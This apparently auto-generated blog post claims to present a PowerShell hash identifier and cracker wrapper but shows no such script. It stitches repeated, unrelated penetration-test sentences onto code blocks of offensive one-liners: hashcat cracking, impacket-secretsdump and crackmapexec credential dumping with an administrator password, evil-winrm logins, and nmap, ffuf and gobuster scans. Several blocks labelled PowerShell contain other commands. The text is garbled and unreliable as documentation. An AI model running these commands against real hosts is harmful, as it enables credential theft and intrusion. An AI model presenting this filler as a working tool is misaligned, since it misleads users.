---
TitleSEO: "Hash Identifier and Cracker Wrapper in PowerShell | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "parser, rust, c, go, tool, powershell"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-992.html"
URL_IMAGES: ""
Date: "2024-04-23"
Tags: "Parser, Rust, C, Go, Tool, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-992"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-992.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `rpcclient`
- `GetNPUsers`
- `sharphound`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
evil-winrm -i 10.25.103.163 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.111.76.75
crackmapexec smb 10.13.202.197 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.168.21
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
nmap -sCV -p636,135,139 10.48.253.15 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.223.206/FUZZ
gobuster dir -u http://10.118.3.192/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p22,636,53 10.79.241.211 -oN scan.txt
```

## Output

### Example Output

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 16.63s
```
